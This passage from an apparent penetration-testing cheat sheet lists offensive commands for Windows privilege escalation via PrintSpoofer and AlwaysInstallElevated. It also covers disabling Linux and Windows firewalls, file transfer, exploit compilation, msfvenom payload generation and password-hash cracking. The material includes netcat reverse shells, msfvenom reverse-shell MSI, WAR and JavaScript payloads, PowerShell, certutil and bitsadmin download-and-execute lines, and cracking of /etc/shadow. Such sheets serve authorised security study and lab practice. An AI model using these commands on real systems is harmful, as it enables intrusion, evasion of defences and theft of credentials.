* Leverages the Print Spooler service to get a SYSTEM token, then run a custom command
```
# spawn a SYSTEM command prompt
cmd> printspoofer.exe -i -c cmd

# get a SYSTEM reverse shell
cmd> printspoofer.exe -c "C:\temp\nc.exe [LHOST] [LPORT] -e cmd.exe"
```

### AlwaysInstallElevated

If these 2 registers are enabled (value is 0x1), users of any privilege can install (execute) .msi files as NT AUTHORITY\SYSTEM.

STEP 1: Check registers
```
# OPTION 1:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# OPTION 2:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

STEP 2: Exploit
```
# generate MSI payload in Kali
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[] LPORT=[] -f msi > rshell.msi

# upload to target then execute
cmd> msiexec /quiet /qn /i C:\temp\rshell.msi
```


## Firewall Disabling

Bypassing Linux firewalls.
```
# flush Iptables - delete all rules temporarily.
# add this command before executing reverse shell connection/command.
$ iptables --flush
```

Bypassing Windows firewalls.
```
# Win Vista, 7, 8, Server 2008, 10
cmd> netsh advfirewall set allprofiles state off
cmd> netsh advfirewall set currentprofile state off

# Older Win, XP, Server 2003
cmd> netsh firewall set opmode mode=DISABLE
```

Bypassing firewalls via. SSH local port forwarding.
* Enum'd a new port/service via. `netstat` but can't access it from within the target / it is blocked?
```
# static local port forwarding
$ ssh -L [local_port]:[target/jumpbox]:[blocked_port] [user]@[target]
# example - bypass blocked HTTP service on port 80
$ ssh -L 80:192.168.218.99:80 bob@192.168.218.99

# dynamic local port forwarding
$ ssh -N -D localhost:9050 user@[target/jumpbox]
$ proxychains curl http://localhost/exec            # interact with internal web server
$ proxychains nmap -sT -Pn -sV [internal_target]    # interact with internal target/host
```

## File Transfer Methods

### Generic

SCP (SSH)
```
$ scp [/path/to/source/file] [user]@[target]:[/path/to/dest/file]
$ scp nc.exe bob@10.10.1.11:C:\\users\\bob # win example
$ scp nc alice@10.10.1.11:/tmp             # linux example
```

Netcat
```
# send - adjust seconds depending on filesize
cmd> nc -w [seconds] [destination_ip] [port] < [file.txt] 
# receive
$ nc -nvlp [port] > [file.txt]
```

### Linux
```
```

### Windows

Powershell
```
# Download file from remote to local
cmd> Powershell -c (New-Object Net.WebClient).DownloadFile('http://[host]:[port]/[file]', '[file]')

# Execute remote PS script
PS> IEX (New-Object System.Net.WebClient).DownloadString('http://[kali]/[script].ps1')
```

Certutil
```
cmd> certutil.exe -urlcache -split -f http://[kali]/[src_file]
```

Bitsadmin
```
cmd> bitsadmin /transfer badthings http://[kali]:[port]/[src_file] [dest_file]
```

Wget -> cscript
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

# After you've created wget.vbs
cmd> cscript wget.vbs http://[host]/evil.exe evil.exe
```

SMB
```
# Kali - host SMB share
$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py [sharename] [/path/to/share]  # setup local share

# Target - connect to share
cmd> net view \\[kali]              # view remote shares
cmd> net use \\[kali]\[share]       # connect to share
cmd> copy \\[kali]\[share]\[src_file] [/path/to/dest_file]  # copy file
```

## Compilation

Linux C to .SO (shared library)
```
$ gcc -o exploit.so -shared exploit.c -fPIC 
```

Linux compiles
```
$ gcc -m32 exploit.c -o exploit # 32 bit
$ gcc -m64 exploit.c -o exploit # 64 bit
```

Linux 32/64bit cross-architecture ELF
```
$ gcc -m32 -Wl,--hash-style=both exploit.c -o exploit
```

Linux to Windows EXE
```
# 32 bit Windows
$ i686-w64-mingw32-gcc 25912.c -o exploit.exe -lws2_32

# 64 bit Windows
$ x86_64-w64-mingw32-gcc exploit.c -o exploit.exe 

# run exe in linux
$ wine exploit.exe
```

Windows Python to Windows EXE
```
$ python pyinstaller.py --onefile <pythonscript>
```

## MSFVenom payload generation

Metasploit payload cheatsheet: https://netsec.ws/?p=331

Java / .war
```
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=[kali] LPORT=9999 -f war -o rshell.war
```

Javascript
```
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=[kali] LPORT=443 -f js_le -e generic/none
```


## Hash Cracking

Online hash cracker: https://crackstation.net/

Cracking linux hashes - requires `/etc/passwd` and `/etc/shadow`
```
$ unshadow passwd.txt shadow.txt > passwords.txt
$ john --wordlist=rockyou.txt passwords.txt
```

Hashcat
```
# Check hash type -> crack w/ hashcat
$ hash-identifier [hash]    
$ hashcat -m [hash-type] -a 0 [hash-file] [wordlist] --show -o cracked.txt
```

Crack PDF files
```
# extract hash from PDF
$ pdf2john.pl > hash

# remove .pdf filename prepending hash
# crack hash
$ hashcat -m 10500 hash.txt -a 0 rockyou.txt --show -o cracked.txt
```


